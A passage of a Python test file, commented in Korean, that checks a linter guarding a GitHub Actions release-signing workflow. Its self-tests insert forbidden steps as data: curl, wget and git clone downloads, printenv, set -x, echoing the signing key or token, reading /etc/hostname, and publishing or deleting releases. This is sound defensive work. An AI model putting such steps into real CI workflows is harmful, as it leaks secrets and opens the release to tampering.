        build = {tuple(command["words"]) for command in self.commands("build") if command["words"][:1] == ["python"]}
        self.assertEqual(build - {tuple(support.DOWNLOAD_COMMAND.split())}, set(support.BUILD_PYTHON))
        self.assertIn(tuple(support.DOWNLOAD_COMMAND.split()), build, "빌드 도구 설치는 이름 붙은 한 단계가 따로 부른다")

    def test_the_allowed_variable_names_and_test_shapes_are_exactly_the_ones_the_real_workflow_uses(self):
        names = set()
        for job in ("build", "sign-and-draft"):
            for command in self.commands(job):
                names |= {piece.replace("$", "").replace("{", "").replace("}", "") for piece, _quoted in command["expansions"]}
        self.assertEqual(names, set(support.SHELL_VARIABLES))
        tests = {tuple(command["words"]) for command in self.commands("sign-and-draft") if command["words"][:1] == ["[["] or command["words"][:2] == ["if", "[["]}
        self.assertEqual({shape[1:] if shape[0] == "if" else shape for shape in tests}, set(support.SIGN_TESTS))

    def test_the_asset_names_are_what_the_draft_and_the_summary_list_and_the_notes_and_gh_words_agree(self):
        self.assertEqual(len(support.ASSET_NAMES), support.ASSET_COUNT)
        self.assertEqual(support.ASSET_NAMES, ("ChanceBlogDesktop-*-Setup.exe", "ChanceBlogDesktop-*-win64.zip", "PACKAGE_INFO.json", "PACKAGE_INFO.md", "SHA256SUMS", "update-manifest.json", "update-manifest.json.sig"))
        creates = [command["words"] for command in self.commands("sign-and-draft") if command["words"][:3] == ["gh", "release", "create"]]
        self.assertEqual(len(creates), 2)
        for words in creates:
            options, positionals, unknown = support._gh_create_parse(words)
            self.assertEqual((positionals, unknown), (["v${version}", *support.ASSET_NAMES], []))
            self.assertEqual(sorted(option for option, _value in options), sorted(["--repo", "--draft", "--target", "--title", "--notes-file"] + (["--prerelease"] if "--prerelease" in words else [])))

    def test_the_gh_create_parser_lets_a_value_option_eat_the_next_word_like_gh_does(self):
        options, positionals, unknown = support._gh_create_parse(["gh", "release", "create", "v1", "--title", "--draft", "--target", "x", "a", "--draft=false", "-d", "b"])
        self.assertEqual(options, [("--title", "--draft"), ("--target", "x")])
        self.assertEqual((positionals, unknown), (["v1", "a", "b"], ["--draft=false", "-d"]))
        self.assertEqual(support._gh_create_parse(["gh", "release", "create", "--repo"])[0], [("--repo", None)], "값이 모자라면 None")

    def test_the_gh_api_checker_takes_options_before_or_after_the_path_and_only_two_are_allowed(self):
        ok = 'repos/${GITHUB_REPOSITORY}/releases?per_page=100'
        self.assertEqual(support._gh_api_problems("w", ["gh", "api", ok, "--paginate", "--jq", ".[]"]), [])
        self.assertEqual(support._gh_api_problems("w", ["gh", "api", "--jq", ".[]", ok]), [])
        for words in (["gh", "api", ok, "-fx=1"], ["gh", "api", "-X", "POST", ok], ["gh", "api", ok, "--method=POST"], ["gh", "api", ok, "-H", "x"], ["gh", "api", ok, "--hostname", "h"], ["gh", "api", "repos/${GITHUB_REPOSITORY}/../x"],
                      ["gh", "api", "repos/o/r/releases"], ["gh", "api"], ["gh", "api", ok, "extra"], ["gh", "api", ok, "--jq"]):
            with self.subTest(words=words):
                self.assertTrue(support._gh_api_problems("w", words), words)

    def test_the_gh_api_checker_refuses_an_option_given_twice_because_gh_lets_the_later_value_win(self):
        """구현자 보충 확인: `--jq` 가 둘이면 gh 는 뒤의 식을 쓰므로 뒤의 `--jq .` 가 앞의 `error(...)` 를 지운다 — 사후 점검이 아무것도 못 막게 된다. `--jq`·`--paginate` 는 각각 한 번까지다."""
        ok = 'repos/${GITHUB_REPOSITORY}/releases?per_page=100'
        for words, option in ((["gh", "api", ok, "--jq", "error(1)", "--jq", "."], "--jq"), (["gh", "api", ok, "--jq", ".", "--jq", "error(1)"], "--jq"), (["gh", "api", "--jq", ".", ok, "--jq", "."], "--jq"),
                              (["gh", "api", ok, "--paginate", "--paginate", "--jq", "."], "--paginate"), (["gh", "api", "--paginate", ok, "--jq", ".", "--paginate"], "--paginate")):
            with self.subTest(words=words):
                problems = support._gh_api_problems("w", words)
                self.assertEqual(len(problems), 1, problems)
                self.assertTrue(problems[0].startswith("W-9:") and option + " 가 2번 있다" in problems[0], problems)
        self.assertEqual(support._gh_api_problems("w", ["gh", "api", ok, "--paginate", "--jq", "--paginate"]), [], "--jq 의 값으로 먹힌 낱말은 옵션이 아니다 — 둘로 세지 않는다")
        self.assertEqual(support._gh_api_problems("w", ["gh", "api", "--paginate", ok, "--jq", "--jq"]), [], "--jq 의 식이 글자 --jq 여도 옵션이 아니다")


class RuleSelfTest(unittest.TestCase):
    """규칙이 실제로 걸리는지 — 어기는 변형은 모두 빨개지고 **그 규칙의 이름표**가 목록에 있으며 진짜 글은 통과한다(설계서 ⑤ 의 열 가지 변이와 그 밖의 변형, 모두 진짜 글에서 한 곳만 바꾼다)."""

    def variants(self):
        ON = "on:\n  workflow_dispatch:\n"
        TOP = "permissions: {}\n"
        BUILD_PERM = "    permissions:\n      contents: read\n      actions: read\n"
        SIGN_PERM = "    permissions:\n      contents: write\n"
        CONC = "concurrency:\n  group: release\n  cancel-in-progress: false\n"
        DEFAULTS = "defaults:\n  run:\n    shell: bash\n"
        PREFLIGHT_BUILD = step_text("사전 점검")
        PACKAGE_STEP = step_text("묶음과 휴대용 압축 파일 만들기")
        DOWNLOAD_STEP = step_text(support.DOWNLOAD_STEP_NAME)
        VERIFY_STEP = step_text("후보 검증(자산을 다시 해시해 후보 목록과 대조)")
        MANIFEST_STEP = step_text("매니페스트 만들기")
        SIGN_STEP = step_text("서명과 자체 검증(비밀은 이 단계에만)")
        HASH_STEP = step_text("해시 목록 만들기")
        DRAFT_STEP = step_text("초안 만들기(공개하지 않는다)")
        POST_STEP = step_text("사후 점검(초안이 있고 태그는 아직 없다)")
        UPLOAD_STEP = step_text("올리기(후보 파일 여섯, 1일)")
        CHECK_STEP = step_text("사슬 다시 확인(서명 뒤)")
        NOTES_STEP = step_text("릴리스 본문 만들기")
        SIGN_PREFLIGHT = step_text("사전 점검 다시(초안까지 보이는 쓰기 권한 잡에서)")
        FIRST_UPLOAD_PATH = "            ${{ runner.temp }}/release/ChanceBlogDesktop-*-Setup.exe\n"
        BUILD_TIMEOUT, SIGN_TIMEOUT = "    timeout-minutes: 45\n", "    timeout-minutes: 15\n"
        DRAFT_ARG = " --draft"
        RC_LINE = line_with("--prerelease")
        STABLE_LINE = [line for line in REAL.split("\n") if "gh release create" in line and "--prerelease" not in line][0]
        v = {}

        def add(label, text, *rules):
            assert label not in v, label
            v[label] = (text, rules)

        # ---- 설계서 ⑤ 의 열 가지 변이 ------------------------------------------------------------------------------------------------------------
        add("설계 ① --draft 삭제(두 호출 모두)", mutate_sign(DRAFT_ARG + " ", " ", 2), "W-9")
        add("설계 ② build 에 contents: write", mutate_build(BUILD_PERM, "    permissions:\n      contents: write\n      actions: read\n"), "W-3")
        add("설계 ③ sign-and-draft 에 pip install 추가", inject_sign("pip install requests"), "W-8", "W-15")
        add("설계 ④ build 에서 secrets 참조", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run:", "        env:\n          K: ${{ secrets.UPDATE_SIGNING_KEY }}\n        run:")), "W-4")
        add("설계 ⑤ uses 를 태그로", mutate(CHECKOUT, "actions/checkout@v4", 2), "W-5", "W-16")
        add("설계 ⑥ 업로드 보존 30일", mutate("          retention-days: 1\n", "          retention-days: 30\n"), "W-11")
        add("설계 ⑦ 입력칸 추가", mutate(ON, ON + "    inputs:\n      note:\n        type: string\n"), "W-1")
        add("설계 ⑧ 환경 이름 변경", mutate("    environment: release\n", "    environment: production\n"), "W-14", "W-4")
        add("설계 ⑨ --target 을 가지 이름으로", mutate_sign('--target "$TARGET_SHA"', "--target main", 2), "W-10")
        add("설계 ⑩ 후보 대조(verify-candidate) 단계 삭제", mutate_sign(VERIFY_STEP + "\n", ""), "구조", "X-2")

        # ---- W-1 트리거 -------------------------------------------------------------------------------------------------------------------------
        for event, extra in (("push", "  push:\n"), ("pull_request", "  pull_request:\n"), ("pull_request_target", "  pull_request_target:\n"), ("schedule", "  schedule:\n    - cron: '0 0 * * *'\n"),
                             ("workflow_run", "  workflow_run:\n    workflows:\n      - x\n"), ("workflow_call", "  workflow_call:\n"), ("release", "  release:\n    types:\n      - published\n"),
                             ("issue_comment", "  issue_comment:\n"), ("repository_dispatch", "  repository_dispatch:\n")):
            add(f"W-1 {event} 추가", mutate(ON, ON + extra), "W-1")
        add("W-1 입력칸 추가(필수·선택)", mutate(ON, ON + "    inputs:\n      tag:\n        required: true\n"), "W-1")
        add("W-1 한 줄 흐름식 on", mutate(ON, "on: [push, workflow_dispatch]\n"), "구조")
        add("W-1 on 없음", mutate(ON, ""), "W-1")
        add("W-1 workflow_dispatch 에 설정", mutate(ON, "on:\n  workflow_dispatch:\n    branches: x\n"), "W-1")

        # ---- W-2 최상위 권한 ----------------------------------------------------------------------------------------------------------------------
        add("W-2 최상위 permissions 없음", mutate(TOP + "\n", ""), "W-2")
        add("W-2 최상위 contents: read", mutate(TOP, "permissions:\n  contents: read\n"), "W-2")
        add("W-2 read-all", mutate(TOP, "permissions: read-all\n"), "W-2")
        add("W-2 write-all", mutate(TOP, "permissions: write-all\n"), "W-2")
        add("W-2 최상위 contents: write", mutate(TOP, "permissions:\n  contents: write\n"), "W-2")
        add("W-2 공백이 든 빈 매핑은 읽개가 거절", mutate(TOP, "permissions: { }\n"), "구조")

        # ---- W-3 잡 권한 -------------------------------------------------------------------------------------------------------------------------
        add("W-3 build 에 id-token", mutate_build(BUILD_PERM, BUILD_PERM + "      id-token: write\n"), "W-3")
        add("W-3 build 에 actions: write", mutate_build(BUILD_PERM, "    permissions:\n      contents: read\n      actions: write\n"), "W-3")
        add("W-3 build 권한 블록 없음", mutate_build(BUILD_PERM, ""), "W-3")
        add("W-3 build 에 packages: write", mutate_build(BUILD_PERM, BUILD_PERM + "      packages: write\n"), "W-3")
        add("W-3 sign 이 contents: read", mutate_sign(SIGN_PERM, "    permissions:\n      contents: read\n"), "W-3")
        add("W-3 sign 에 id-token", mutate_sign(SIGN_PERM, SIGN_PERM + "      id-token: write\n"), "W-3")
        add("W-3 sign 에 attestations", mutate_sign(SIGN_PERM, SIGN_PERM + "      attestations: write\n"), "W-3")
        add("W-3 sign 에 pull-requests", mutate_sign(SIGN_PERM, SIGN_PERM + "      pull-requests: write\n"), "W-3")
        add("W-3 sign 에 issues", mutate_sign(SIGN_PERM, SIGN_PERM + "      issues: write\n"), "W-3")
        add("W-3 sign 에 actions: read", mutate_sign(SIGN_PERM, SIGN_PERM + "      actions: read\n"), "W-3")
        add("W-3 sign 권한 write-all", mutate_sign(SIGN_PERM, "    permissions: write-all\n"), "W-3")
        add("W-3 sign 권한 블록 없음", mutate_sign(SIGN_PERM, ""), "W-3")
        add("W-3 단계 수준 permissions", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run:", "        permissions:\n          contents: write\n        run:")), "W-3")
        add("W-3 셋째 잡(쓰기 권한)", REAL + "\n  extra:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo hi\n", "W-3")

        # ---- W-4 비밀 ---------------------------------------------------------------------------------------------------------------------------
        add("W-4 build 잡 env 에 비밀", mutate_build("    env:\n      PYTHONUTF8: '1'\n", "    env:\n      PYTHONUTF8: '1'\n      K: ${{ secrets.UPDATE_SIGNING_KEY }}\n"), "W-4")
        add("W-4 둘째 비밀(secrets.OTHER)", mutate_sign(SIGN_STEP, SIGN_STEP.replace("          UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}\n", "          UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}\n          EXTRA: ${{ secrets.OTHER }}\n")), "W-4")
        add("W-4 다른 단계에도 서명 비밀", mutate_sign(HASH_STEP, HASH_STEP.replace("        run:", "        env:\n          UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}\n        run:")), "W-4")
        add("W-4 with 에 비밀", mutate_sign(step_text("후보 받기"), step_text("후보 받기").replace("          name: release-candidate\n", "          name: release-candidate\n          github-token: ${{ secrets.UPDATE_SIGNING_KEY }}\n")), "W-4")
        add("W-4 secrets.GITHUB_TOKEN 사용", mutate_build(PREFLIGHT_BUILD, PREFLIGHT_BUILD.replace("${{ github.token }}", "${{ secrets.GITHUB_TOKEN }}")), "W-4")
        add("W-4 환경 변수 이름이 GITHUB_TOKEN", mutate_build(PREFLIGHT_BUILD, PREFLIGHT_BUILD.replace("GH_TOKEN:", "GITHUB_TOKEN:")), "W-4")
        add("W-4 checkout 의 with 로 토큰", mutate_build("          persist-credentials: false\n", "          persist-credentials: false\n          token: ${{ github.token }}\n"), "W-4", "W-6")
        add("W-4 잡 env 에 토큰", mutate_sign("    env:\n      PYTHONUTF8: '1'\n", "    env:\n      PYTHONUTF8: '1'\n      GH_TOKEN: ${{ github.token }}\n"), "W-4")
        add("W-4 서명 단계 env 키 이름 바꿈", mutate_sign("          UPDATE_SIGNING_KEY: ${{ secrets", "          SIGNING_KEY: ${{ secrets"), "W-4")
        add("W-4 환경 없는 잡에서 비밀", mutate("    environment: release\n", ""), "W-4", "W-14")
        add("W-4 toJSON 으로 맥락 통째 꺼내기", mutate_build(PREFLIGHT_BUILD, PREFLIGHT_BUILD.replace("${{ github.token }}", "${{ toJSON(github) }}")), "W-4")
        add("W-4 run 안에 비밀", mutate_sign(SIGN_STEP, SIGN_STEP.replace('--require-openssl\n', '--require-openssl ${{ secrets.UPDATE_SIGNING_KEY }}\n')), "W-4", "W-7")

        # ---- W-5 액션 ---------------------------------------------------------------------------------------------------------------------------
        add("W-5 짧은 SHA", mutate(SETUP, "actions/setup-python@0123456", 2), "W-5", "W-16")
        add("W-5 다른 SHA", mutate(UPLOAD, "actions/upload-artifact@" + OTHER_SHA), "W-5")
        add("W-5 다운로드 액션이 태그", mutate(DOWNLOAD, "actions/download-artifact@v4"), "W-5", "W-16")
        add("W-5 다른 소유자", mutate(DOWNLOAD, "canary-org/download-artifact@" + APPROVED["actions/download-artifact"][0]), "W-5", "W-16")
        add("W-5 docker 액션", mutate_build(step_text("가져오기"), "      - name: 가져오기\n        uses: docker://alpine:3\n"), "W-5")
        add("W-5 로컬 액션", mutate_build(step_text("가져오기"), "      - name: 가져오기\n        uses: ./.github/actions/x\n"), "W-5")
        add("W-5 잡 수준 uses(재사용 워크플로)", mutate_build("    runs-on: windows-latest\n", "    uses: ./.github/workflows/other.yml\n    runs-on: windows-latest\n"), "W-5")
        add("W-5 새 액션(cache)", mutate_build(PACKAGE_STEP, "      - name: 캐시\n        uses: actions/cache@" + OTHER_SHA + "\n        with:\n          path: x\n          key: y\n\n" + PACKAGE_STEP), "W-5", "W-16")
        add("W-5 SHA 없이 이름만", mutate(SETUP, "actions/setup-python", 2), "W-5")
        add("W-5 한 줄 흐름식 단계로 태그 액션", mutate_build(PACKAGE_STEP, "      - {uses: actions/cache@v4}\n\n" + PACKAGE_STEP), "구조")

        # ---- W-6 checkout ------------------------------------------------------------------------------------------------------------------------
        add("W-6 persist-credentials 켬", mutate("          persist-credentials: false\n", "          persist-credentials: true\n", 2), "W-6")
        add("W-6 with 없음", mutate_sign(step_text("가져오기"), "      - name: 가져오기\n        uses: " + CHECKOUT + "  # v4.4.0\n"), "W-6")
        add("W-6 fetch-depth 더함", mutate_build("          persist-credentials: false\n", "          persist-credentials: false\n          fetch-depth: 0\n"), "W-6")

        # ---- W-7 run 안의 식·출력 ----------------------------------------------------------------------------------------------------------------
        add("W-7 run 에 github.sha 식", mutate_build(DOWNLOAD_STEP, DOWNLOAD_STEP.rstrip("\n") + " ${{ github.sha }}\n"), "W-7")
        add("W-7 run 에 이벤트 글 식", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.rstrip("\n") + " ${{ github.event.head_commit.message }}\n"), "W-7")
        add("W-7 set -x", inject_sign("set -x"), "W-7", "W-8", "W-16")
        add("W-7 env 로 환경 전체 출력", inject_sign("env"), "W-7", "W-8", "W-16")
        add("W-7 printenv", inject_sign("printenv"), "W-7", "W-8", "W-16")
        add("W-7 export -p", inject_sign("export -p"), "W-7", "W-8", "W-16")
        add("W-7 서명 변수를 echo", inject_sign('echo "$UPDATE_SIGNING_KEY"'), "W-7")
        add("W-7 토큰 변수를 echo", inject_sign('echo "$GH_TOKEN"'), "W-7")
        add("W-7 build 단계의 set -x", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run: python", "        run: |\n          set -x\n          python")), "W-7", "W-16")

        # ---- W-8 sign-and-draft 의 명령 ---------------------------------------------------------------------------------------------------------
        for label, line in (("curl", "curl -O x"), ("wget", "wget x"), ("npm", "npm install x"), ("Invoke-WebRequest", "Invoke-WebRequest x"), ("dotnet", "dotnet tool install x"), ("choco", "choco install x"), ("winget", "winget install x"),
                            ("bash -c", 'bash -c "echo x"'), ("sh -c", "sh -c 'echo x'"), ("eval", 'eval "$version"'), ("source", "source x.sh"), ("점", ". x.sh"), ("git clone", "git clone x"), ("sudo", "sudo ls"),
                            ("xargs", "ls | xargs rm"), ("openssl", "openssl s_client -connect x:443"), ("cat", "cat x")):
            add(f"W-8 {label}", inject_sign(line), "W-8")
        add("W-8 python -m pip", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.replace("python scripts/update_manifest.py build", "python -m pip install x")), "W-8", "W-15")
        add("W-8 python -c", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.replace("python scripts/update_manifest.py build", 'python -c "print(1)"')), "W-8")
        add("W-8 명령 치환", inject_sign("echo $(date)"), "W-8")
        add("W-8 백틱", inject_sign("echo `date`"), "W-8")
        add("W-8 gh extension", inject_sign("gh extension install x/y"), "W-8", "W-15")
        add("W-8 gh 다른 하위 명령", inject_sign("gh pr merge 1"), "W-8")
        add("W-8 python 절대 경로 스크립트", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.replace("python scripts/update_manifest.py build", "python /tmp/x.py build")), "W-8")
        add("W-8 허용 밖 방향 바꾸기", inject_sign("echo hi > /tmp/x"), "W-8")
        add("W-8 gh api 가 다른 저장소", mutate_sign("          gh api \"repos/${GITHUB_REPOSITORY}/releases?per_page=100\"", "          gh api \"repos/other/x/releases?per_page=100\""), "W-8")                # 사후 점검의 릴리스 목록 줄(재작업 1 에서 `?per_page=100` 이 붙었다)

        add("W-8 read 가 다른 파일을 읽음", inject_sign("read -r other < /etc/hostname"), "W-8")
        add("W-8 read 가 다른 변수에 읽음", inject_sign("read -r version2 < VERSION"), "W-8")

        # ---- W-9 공개·수정 ----------------------------------------------------------------------------------------------------------------------
        add("W-9 후보용 호출에서만 --draft 삭제", mutate_sign(RC_LINE, RC_LINE.replace(" --draft", "")), "W-9")
        add("W-9 정식용 호출에서만 --draft 삭제", mutate_sign(STABLE_LINE, STABLE_LINE.replace(" --draft", "")), "W-9")
        add("W-9 --draft=false", mutate_sign(RC_LINE, RC_LINE.replace(" --draft", " --draft=false")), "W-9")
        add("W-9 --publish", mutate_sign(RC_LINE, RC_LINE.replace(" --draft", " --draft --publish")), "W-9")
        add("W-9 gh release edit", inject_sign("gh release edit v1 --draft=false"), "W-9", "W-8")
        add("W-9 gh release upload", inject_sign("gh release upload v1 x"), "W-9")
        add("W-9 gh release delete", inject_sign("gh release delete v1"), "W-9")
        add("W-9 gh release download", inject_sign("gh release download v1"), "W-9", "W-15")
        add("W-9 gh api 로 수정(-X PATCH)", inject_sign('gh api -X PATCH "repos/${GITHUB_REPOSITORY}/releases/1"'), "W-9")
        add("W-9 gh api 로 필드 보내기(-f)", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases/1" -f draft=false'), "W-9")
        add("W-9 gh api --method", inject_sign('gh api "repos/${GITHUB_REPOSITORY}/releases" --method POST'), "W-9")
        add("W-9 --latest 옵션", mutate_sign(RC_LINE, RC_LINE.replace(" --draft", " --draft --latest")), "W-9")
        add("W-9 build 잡에서 gh 호출", mutate_build(PACKAGE_STEP.rstrip("\n"), PACKAGE_STEP.rstrip("\n") + "\n\n      - name: 몰래 올림\n        run: gh release create v1 --draft x\n"), "W-9")
        add("W-9 build 잡에서 gh api 호출(release create 옵션 검사에는 안 걸리고 'gh 는 sign 잡에서만' 검사만 걸린다 — Q 의 K40)", mutate_build(PACKAGE_STEP.rstrip("\n"), PACKAGE_STEP.rstrip("\n") + "\n\n      - name: 몰래 읽음\n        run: gh api \"repos/${GITHUB_REPOSITORY}/releases\" --jq .\n"), "W-9")

        # ---- W-10 --target ---------------------------------------------------------------------------------------------------------------------
        add("W-10 --target 이 가지 이름 변수", mutate_sign('--target "$TARGET_SHA"', '--target "$GITHUB_REF_NAME"', 2), "W-10")
        add("W-10 --target 이 GITHUB_SHA(env 에 없음)", mutate_sign('--target "$TARGET_SHA"', '--target "$GITHUB_SHA"', 2), "W-10")
        add("W-10 TARGET_SHA 가 가지 이름", mutate_sign("          TARGET_SHA: ${{ github.sha }}\n", "          TARGET_SHA: ${{ github.ref_name }}\n"), "W-10")
        add("W-10 --target 삭제", mutate_sign(' --target "$TARGET_SHA"', "", 2), "W-10")
        add("W-10 --target 이 직접 식", mutate_sign('--target "$TARGET_SHA"', '--target "${{ github.sha }}"', 2), "W-7", "W-8")
        add("W-10 --target 이 둘", mutate_sign(RC_LINE, RC_LINE.replace(" --target", " --target main --target")), "W-10")

        # ---- W-11 올리기 -----------------------------------------------------------------------------------------------------------------------
        add("W-11 보존 칸 없음", mutate("          retention-days: 1\n", ""), "W-11")
        add("W-11 보존 2일", mutate("          retention-days: 1\n", "          retention-days: 2\n"), "W-11")
        add("W-11 없어도 경고만", mutate("if-no-files-found: error", "if-no-files-found: warn"), "W-11")
        add("W-11 로그 업로드", mutate(FIRST_UPLOAD_PATH, FIRST_UPLOAD_PATH + "            ${{ runner.temp }}/package/work/build.log\n"), "W-11", "W-16")
        add("W-11 와일드카드 폴더", mutate(FIRST_UPLOAD_PATH, "            ${{ runner.temp }}/**/ChanceBlogDesktop-*-Setup.exe\n"), "W-11", "W-16")
        add("W-11 다른 폴더", mutate(FIRST_UPLOAD_PATH, "            ${{ runner.temp }}/package/work/ChanceBlogDesktop-*-Setup.exe\n"), "W-11")
        add("W-11 모양 밖 파일", mutate(FIRST_UPLOAD_PATH, FIRST_UPLOAD_PATH + "            ${{ runner.temp }}/release/notes.txt\n"), "W-11", "W-16")
        add("W-11 설치 파일 이름이 허용 모양 밖", mutate(FIRST_UPLOAD_PATH, "            ${{ runner.temp }}/release/ChanceBlogDesktop-setup.exe\n"), "W-11", "W-16")
        add("W-11 허용 모양이나 이 흐름의 여섯 밖(시험 보고서)", mutate(FIRST_UPLOAD_PATH, FIRST_UPLOAD_PATH + "            ${{ runner.temp }}/release/INSTALLER_SPIKE_REPORT.md\n"), "W-11")
        add("W-11 with 키를 더함", mutate("          if-no-files-found: error\n", "          if-no-files-found: error\n          overwrite: true\n"), "W-11")
        add("W-11 업로드를 하나 더(sign 잡)", mutate_sign(step_text("작업 요약(공개 전 확인 목록)"), step_text("작업 요약(공개 전 확인 목록)") + "\n      - name: 또 올림\n        uses: " + UPLOAD + "\n        with:\n          name: x\n          path: ${{ runner.temp }}/draft/SHA256SUMS\n          retention-days: 1\n          if-no-files-found: error\n"), "구조", "W-11")

        # ---- W-12 시간 한도 --------------------------------------------------------------------------------------------------------------------
        add("W-12 build 46분", mutate(BUILD_TIMEOUT, "    timeout-minutes: 46\n"), "W-12")
        add("W-12 sign 16분", mutate(SIGN_TIMEOUT, "    timeout-minutes: 16\n"), "W-12")
        add("W-12 build 한도 없음", mutate(BUILD_TIMEOUT, ""), "W-12")
        add("W-12 sign 한도 없음", mutate(SIGN_TIMEOUT, ""), "W-12")
        add("W-12 한도가 글자", mutate(SIGN_TIMEOUT, "    timeout-minutes: fifteen\n"), "W-12")
        add("W-12 한도 0", mutate(SIGN_TIMEOUT, "    timeout-minutes: 0\n"), "W-12")

        # ---- W-13 동시 실행 --------------------------------------------------------------------------------------------------------------------
        add("W-13 concurrency 없음", mutate(CONC + "\n", ""), "W-13")
        add("W-13 묶음 이름이 다름", mutate(CONC, "concurrency:\n  group: release-${{ github.ref }}\n  cancel-in-progress: false\n"), "W-13")
        add("W-13 취소 켬", mutate(CONC, "concurrency:\n  group: release\n  cancel-in-progress: true\n"), "W-13")
        add("W-13 취소 칸 없음", mutate(CONC, "concurrency:\n  group: release\n"), "W-13")

        # ---- W-14 환경 -------------------------------------------------------------------------------------------------------------------------
        add("W-14 build 에 environment", mutate_build("    timeout-minutes: 45\n", "    timeout-minutes: 45\n    environment: release\n"), "W-14")
        add("W-14 sign 의 environment 삭제", mutate("    environment: release\n", ""), "W-14")
        add("W-14 environment 가 매핑", mutate("    environment: release\n", "    environment:\n      name: release\n"), "W-14")

        # ---- W-15 바깥 내려받기 ----------------------------------------------------------------------------------------------------------------
        add("W-15 다른 build 단계에 pip install", mutate_build(PACKAGE_STEP, PACKAGE_STEP.replace("        run: python", "        run: |\n          python -m pip install x\n          python")), "W-15")
        add("W-15 build 단계에 curl", mutate_build(PACKAGE_STEP.rstrip("\n"), PACKAGE_STEP.rstrip("\n") + "\n\n      - name: 받기\n        run: curl -O x\n"), "W-15")
        add("W-15 build 단계에 Invoke-WebRequest", mutate_build(PACKAGE_STEP.rstrip("\n"), PACKAGE_STEP.rstrip("\n") + "\n\n      - name: 받기\n        run: Invoke-WebRequest x\n"), "W-15")
        add("W-15 build 단계에 git clone", mutate_build(PACKAGE_STEP.rstrip("\n"), PACKAGE_STEP.rstrip("\n") + "\n\n      - name: 받기\n        run: git clone x\n"), "W-15")
        add("W-15 설치 단계 이름을 바꿈", mutate_build(support.DOWNLOAD_STEP_NAME, "도구 설치"), "W-15")
        add("W-15 설치 단계를 둘로", mutate_build(DOWNLOAD_STEP, DOWNLOAD_STEP + "\n" + DOWNLOAD_STEP.replace(support.DOWNLOAD_STEP_NAME, "도구 한 번 더")), "W-15")
        add("W-15 설치 단계에 추가 색인", mutate_build(support.DOWNLOAD_COMMAND, support.DOWNLOAD_COMMAND + " --extra-index-url x"), "W-15")
        add("W-15 설치 단계에서 잠금 파일을 바꿈", mutate_build("requirements-package.txt", "other.txt"), "W-15")
        add("W-15 설치 단계 삭제", mutate_build(DOWNLOAD_STEP + "\n", ""), "W-15")
        add("W-15 sign 잡에 npm", inject_sign("npm ci"), "W-15", "W-8")

        # ---- W-16 기존 규칙 --------------------------------------------------------------------------------------------------------------------
        add("W-16 SHA 고정 규칙(짧은 SHA)", mutate(UPLOAD, "actions/upload-artifact@ea165f8"), "W-16", "W-5")
        add("W-16 승인된 액션 쌍 밖(다른 저장소 이름)", mutate(UPLOAD, "actions/upload-pages-artifact@" + APPROVED["actions/upload-artifact"][0]), "W-16", "W-5")

        # ---- X-1·X-2 (더한 규칙) ---------------------------------------------------------------------------------------------------------------
        add("X-1 서명 단계에 다른 명령이 낌", mutate_sign(SIGN_STEP, SIGN_STEP.replace("        run: python scripts/update_sign.py", "        run: |\n          echo hi\n          python scripts/update_sign.py")), "X-1", "구조")
        add("X-1 서명 단계가 다른 스크립트를 부름", mutate_sign("python scripts/update_sign.py", "python scripts/other_sign.py"), "X-1", "구조")
        add("X-1 서명 단계에서 --manifest 삭제", mutate_sign(' --manifest "$RUNNER_TEMP/release/update-manifest.json"', ""), "X-1", "구조")
        add("X-1 비밀 단계가 둘", mutate_sign(MANIFEST_STEP, MANIFEST_STEP.replace("        run:", "        env:\n          UPDATE_SIGNING_KEY: ${{ secrets.UPDATE_SIGNING_KEY }}\n        run:")), "X-1", "W-4")
        add("X-2 서명이 매니페스트 만들기보다 앞", mutate_sign(MANIFEST_STEP + "\n" + SIGN_STEP, SIGN_STEP + "\n" + MANIFEST_STEP), "X-2", "구조")
        add("X-2 후보 받기가 후보 검증보다 뒤", mutate_sign(step_text("후보 받기") + "\n" + VERIFY_STEP, VERIFY_STEP + "\n" + step_text("후보 받기")), "X-2", "구조")
        add("X-2 초안 만들기가 서명보다 앞", mutate_sign(SIGN_STEP + "\n" + HASH_STEP + "\n" + CHECK_STEP + "\n" + NOTES_STEP + "\n" + DRAFT_STEP, DRAFT_STEP + "\n" + SIGN_STEP + "\n" + HASH_STEP + "\n" + CHECK_STEP + "\n" + NOTES_STEP), "X-2", "구조")
        add("X-2 해시 목록이 서명보다 앞", mutate_sign(SIGN_STEP + "\n" + HASH_STEP, HASH_STEP + "\n" + SIGN_STEP), "X-2", "구조")
        add("X-2 사슬 다시 확인 삭제", mutate_sign(CHECK_STEP + "\n", ""), "X-2", "구조")
        add("X-2 릴리스 본문이 초안보다 뒤", mutate_sign(NOTES_STEP + "\n" + DRAFT_STEP, DRAFT_STEP + "\n" + NOTES_STEP), "X-2", "구조")
        add("X-2 해시 목록 단계 삭제", mutate_sign(HASH_STEP + "\n", ""), "X-2", "구조")
        add("X-2 매니페스트 만들기 삭제", mutate_sign(MANIFEST_STEP + "\n", ""), "X-2", "구조")

        GUARD = '          [[ "$version" =~ $re ]] || exit 1\n'
        add("구조 버전 모양 확인을 뺌(두 단계)", mutate_sign(GUARD, "", 2), "구조")
        add("구조 read 뒤의 끝 줄바꿈 대비를 뺌", mutate_sign(' || [[ -n "$version" ]]\n', "\n", 2), "구조")
        add("구조 버전 모양 확인의 정규식을 느슨하게", mutate_sign("(-rc[.][0-9]+)?$'", "(-[a-z]+[.][0-9]+)?$'", 2), "구조")
        add("구조 버전 모양 확인이 실패해도 계속(exit 를 true 로)", mutate_sign('=~ $re ]] || exit 1\n', '=~ $re ]] || true\n', 2), "구조")

        # ---- 구조 허용 목록(규칙 이름표 없이 구조만 잡는 변경) ---------------------------------------------------------------------------------------
        add("구조 서명 단계에서 --require-shipped-key 삭제", mutate_sign(" --require-shipped-key", ""), "구조", "X-1")
        add("구조 서명 단계에서 --require-openssl 삭제", mutate_sign(" --require-openssl", ""), "구조", "X-1")
